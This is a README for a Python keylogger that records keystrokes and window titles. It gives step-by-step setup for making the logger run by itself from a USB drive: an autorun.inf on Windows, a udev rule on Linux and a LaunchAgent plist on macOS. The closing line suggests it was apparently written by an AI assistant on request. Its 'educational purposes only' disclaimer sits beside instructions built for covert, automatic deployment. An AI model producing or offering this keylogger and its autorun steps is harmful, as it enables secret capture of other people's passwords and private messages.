# **Keylogger with Autorun Support**

This project is a simple keylogger written in Python, which logs key presses along with the active window titles. It has been converted to a `.exe` file for easy use on Windows systems and includes optional **autorun** functionality when placed on a USB drive. The keylogger is designed for **educational purposes only** and should be used in controlled environments or with explicit consent.

---

## **Features**
- Logs all key presses to a file (`key_log.txt`).
- Captures the active window title for context.
- Cross-platform support:
  - **Windows**: Supports `.exe` conversion and optional autorun with `autorun.inf`.
  - **Linux**: Can run with Python directly; udev rules for USB autorun.
  - **macOS**: Supports Python execution and `.plist` for autorun.
- Automatically stops and saves logs when the USB is removed (Linux/macOS).

---

## **How to Run**

### **1. For Windows**
1. **Run the Pre-Converted `.exe`**:
   - Download the `Keylogger.exe` file from the repository.
   - Place it on your USB drive or anywhere on your system.
   - Double-click the `.exe` to start logging.

2. **Enable Autorun (Optional)**:
   - Place the provided `autorun.inf` file in the **root directory** of your USB drive.
   - Ensure the `autorun.inf` contains:
     ```
     [Autorun]
     open=Keylogger.exe
     icon=Keylogger.ico
     ```
   - Insert the USB drive into a Windows machine. The `.exe` should automatically run (if autorun is enabled).

3. **Log File**:
   - The key presses will be saved in a file named `key_log.txt` in the same directory as the `.exe`.

---

### **2. For Linux**
1. **Install Python**:
   - Ensure Python 3 is installed on your system.
   - Install dependencies by running:
     ```
     pip3 install pynput python-xlib
     ```

2. **Run the Script**:
   - Download `keylogger.py` and run it with:
     ```
     python3 keylogger.py
     ```

3. **Optional: Enable USB Autorun**:
   - Place the script on a USB and create a shell script named `start_keylogger.sh` to execute it:
     ```
     #!/bin/bash
     python3 /path/to/keylogger.py
     ```
   - Add a udev rule to automatically start the keylogger when the USB is inserted:
     ```
     sudo nano /etc/udev/rules.d/99-usb-keylogger.rules
     ```
   - Add the following content (replace `idVendor` and `idProduct` with your USB's IDs):
     ```
     ACTION=="add", ATTRS{idVendor}=="YOUR_USB_VENDOR_ID", ATTRS{idProduct}=="YOUR_USB_PRODUCT_ID", RUN+="/path/to/start_keylogger.sh"
     ```

---

### **3. For macOS**
1. **Install Python**:
   - Install dependencies by running:
     ```
     pip3 install pynput pyobjc
     ```

2. **Run the Script**:
   - Download `keylogger.py` and run it with:
     ```
     python3 keylogger.py
     ```

3. **Optional: Enable USB Autorun**:
   - Create a shell script named `start_keylogger.sh` to run the keylogger:
     ```
     #!/bin/bash
     python3 /path/to/keylogger.py
     ```
   - Add a `.plist` file in `~/Library/LaunchAgents/` with the following content:
     ```
     <?xml version="1.0" encoding="UTF-8"?>
     <plist version="1.0">
     <dict>
         <key>Label</key>
         <string>com.usb.keylogger</string>
         <key>ProgramArguments</key>
         <array>
             <string>/Volumes/USB_NAME/start_keylogger.sh</string>
         </array>
         <key>RunAtLoad</key>
         <true/>
     </dict>
     </plist>
     ```
   - Load the agent with:
     ```
     launchctl load ~/Library/LaunchAgents/com.usb.keylogger.plist
     ```

---

## **File Structure**

When using the USB with autorun functionality, your USB drive should have the following files in its **root directory**:

- `autorun.inf`
- `Keylogger.exe`
- `Keylogger.ico` (optional, for custom icon)
- `_internal/` (if your `.exe` depends on additional files)

---

## **Limitations**

- Modern operating systems (Windows 7 and above) often disable autorun for security reasons.
- Autorun works best on older systems or with proper manual configuration.

---

## **Disclaimer**

This project is intended for educational purposes only. Unauthorized use of this tool is strictly prohibited and may violate local laws. Always ensure you have explicit consent before running this tool.

---

Feel free to test the instructions and let me know if you need anything adjusted!
